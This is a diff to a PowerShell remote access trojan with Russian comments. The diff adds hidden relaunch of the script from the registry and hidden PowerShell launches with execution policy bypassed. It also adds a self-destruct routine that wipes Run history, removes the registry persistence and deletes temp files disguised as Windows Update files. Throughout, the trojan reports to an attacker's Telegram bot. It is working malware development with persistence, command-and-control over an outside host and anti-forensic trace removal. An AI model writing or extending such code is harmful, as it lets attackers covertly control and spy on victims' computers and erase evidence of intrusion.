@@ -56,8 +56,10 @@ function Start-FromRegistry {
     }
 }
 
-# Сохраняем текущую версию в реестре
-Save-ToRegistry -Data $scriptContent
+# Сохраняем текущую версию в реестре (только если это не самоуничтожение)
+if ($args[0] -ne "selfdestruct") {
+    Save-ToRegistry -Data $scriptContent
+}
 
 # Функция отправки сообщений с правильной кодировкой
 function Send-Telegram {
@@ -158,6 +160,49 @@ function Compress-Folder {
 $currentDir = "C:\"
 $global:LastSentMessage = ""
 
+# Проверяем, не запущено ли самоуничтожение
+if ($args[0] -eq "selfdestruct") {
+    $success = $true
+    $message = "Процесс самоуничтожения запущен...`n"
+    
+    # Очистка истории RUN
+    try {
+        Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction Stop
+        $message += "✅ История RUN очищена`n"
+    } catch {
+        $success = $false
+        $message += "❌ Ошибка очистки истории RUN`n"
+    }
+    
+    # Удаление данных из реестра
+    try {
+        Remove-ItemProperty -Path $regDataPath -Name $regValueName -Force -ErrorAction Stop
+        $message += "✅ Данные из реестра удалены`n"
+    } catch {
+        $success = $false
+        $message += "❌ Ошибка удаления данных из реестра`n"
+    }
+    
+    # Удаление временных файлов (только наших)
+    try {
+        Get-ChildItem -Path $env:TEMP -Filter "WindowsUpdate*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+        Get-ChildItem -Path $env:TEMP -Filter "WindowsSystem*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+        Get-ChildItem -Path $env:TEMP -Filter "*.ps1" | Where-Object { $_.Name -match "^tmp[A-Za-z0-9]+\.ps1$" } | Remove-Item -Force -ErrorAction SilentlyContinue
+        $message += "✅ Временные файлы RAT удалены`n"
+    } catch {
+        $message += "⚠️ Частичная ошибка удаления временных файлов`n"
+    }
+    
+    if ($success) {
+        $message += "`n🎯 РАТ УСПЕШНО УДАЛЕН! Все следы уничтожены."
+    } else {
+        $message += "`n⚠️ РАТ частично удален. Некоторые следы могли остаться."
+    }
+    
+    Send-Telegram $message
+    exit
+}
+
 # Отправка информации о запуске
 Send-Telegram "RAT активирован на $env:COMPUTERNAME
 Доступные команды:
@@ -249,46 +294,64 @@ $($fileList -join "`n")"
                             }
                         }
                         "^/selfdestruct$" {
-                            $success = $true
-                            $message = "Процесс самоуничтожения запущен...`n"
+                            # Запускаем самоуничтожение в отдельном процессе
+                            $selfDestructScript = @"
+# Самоуничтожение RAT
+`$Token = "$Token"
+`$ChatID = "$ChatID"
+
+function Send-Telegram {
+    param([string]`$Message)
+    `$url = "https://api.telegram.org/bot`$Token/sendMessage"
+    `$body = @{chat_id = `$ChatID; text = `$Message}
+    try { Invoke-RestMethod -Uri `$url -Method Post -Body `$body -UseBasicParsing } catch { }
+}
+
+`$success = `$true
+`$message = "Процесс самоуничтожения запущен...`n"
+
+# Очистка истории RUN
+try {
+    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction Stop
+    `$message += "✅ История RUN очищена`n"
+} catch {
+    `$success = `$false
+    `$message += "❌ Ошибка очистки истории RUN`n"
+}
+
+# Удаление данных из реестра
+try {
+    Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows NT\CurrentVersion\Windows" -Name "Load" -Force -ErrorAction Stop
+    `$message += "✅ Данные из реестра удалены`n"
+} catch {
+    `$success = `$false
+    `$message += "❌ Ошибка удаления данных из реестра`n"
+}
+
+# Удаление временных файлов (только наших)
+try {
+    Get-ChildItem -Path `$env:TEMP -Filter "WindowsUpdate*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+    Get-ChildItem -Path `$env:TEMP -Filter "WindowsSystem*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
+    Get-ChildItem -Path `$env:TEMP -Filter "*.ps1" | Where-Object { `$_.Name -match "^tmp[A-Za-z0-9]+\.ps1`$" } | Remove-Item -Force -ErrorAction SilentlyContinue
+    `$message += "✅ Временные файлы RAT удалены`n"
+} catch {
+    `$message += "⚠️ Частичная ошибка удаления временных файлов`n"
+}
+
+if (`$success) {
+    `$message += "`n🎯 РАТ УСПЕШНО УДАЛЕН! Все следы уничтожены."
+} else {
+    `$message += "`n⚠️ РАТ частично удален. Некоторые следы могли остаться."
+}
+
+Send-Telegram `$message
+"@
                             
-                            # Очистка истории RUN
-                            try {
-                                Remove-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU" -Name "*" -Force -ErrorAction Stop
-                                $message += "✅ История RUN очищена`n"
-                            } catch {
-                                $success = $false
-                                $message += "❌ Ошибка очистки истории RUN`n"
-                            }
+                            $tempFile = [System.IO.Path]::GetTempFileName() + ".ps1"
+                            $selfDestructScript | Out-File -FilePath $tempFile -Encoding UTF8
+                            Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$tempFile`"" -WindowStyle Hidden
                             
-                            # Удаление данных из реестра
-                            try {
-                                Remove-ItemProperty -Path $regDataPath -Name $regValueName -Force -ErrorAction Stop
-                                $message += "✅ Данные из реестра удалены`n"
-                            } catch {
-                                $success = $false
-                                $message += "❌ Ошибка удаления данных из реестра`n"
-                            }
-                            
-                            # Удаление временных файлов
-                            try {
-                                Get-ChildItem -Path $env:TEMP -Filter "*WindowsUpdate*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-                                Get-ChildItem -Path $env:TEMP -Filter "*WindowsSystem*" -ErrorAction SilentlyContinue | Remove-Item -Force -ErrorAction SilentlyContinue
-                                $message += "✅ Временные файлы удалены`n"
-                            } catch {
-                                $message += "⚠️ Частичная ошибка удаления временных файлов`n"
-                            }
-                            
-                            if ($success) {
-                                $message += "`n🎯 РАТ УСПЕШНО УДАЛЕН! Все следы уничтожены."
-                            } else {
-                                $message += "`n⚠️ РАТ частично удален. Некоторые следы могли остаться."
-                            }
-                            
-                            Send-Telegram $message
-                            
-                            # Создаем задание для полного выхода через несколько секунд
-                            Start-Sleep -Seconds 3
+                            # Завершаем основной процесс
                             exit
                         }
                     }
@@ -298,13 +361,21 @@ $($fileList -join "`n")"
     } catch { 
         # В случае ошибки - пытаемся восстановиться из реестра
         Start-Sleep -Seconds 10
-        Start-FromRegistry
+        $recoveredScript = Load-FromRegistry
+        if ($recoveredScript) {
+            $tempScript = [System.IO.Path]::GetTempFileName() + ".ps1"
+            $recoveredScript | Out-File -FilePath $tempScript -Encoding UTF8
+            Start-Process -FilePath "powershell.exe" -ArgumentList "-WindowStyle Hidden -ExecutionPolicy Bypass -File `"$tempScript`"" -WindowStyle Hidden
+        }
+        exit
     }
     
     # Периодически обновляем данные в реестре на случай изменений
-    if ((Get-Date).Minute % 10 -eq 0) {
-        $currentScriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw -Encoding UTF8
-        Save-ToRegistry -Data $currentScriptContent
-        Start-Sleep -Seconds 60
+    if ((Get-Date).Minute % 5 -eq 0) {
+        $currentScriptContent = Get-Content -Path $MyInvocation.MyCommand.Path -Raw -Encoding UTF8 -ErrorAction SilentlyContinue
+        if ($currentScriptContent) {
+            Save-ToRegistry -Data $currentScriptContent
+        }
+        Start-Sleep -Seconds 30
     }
 }
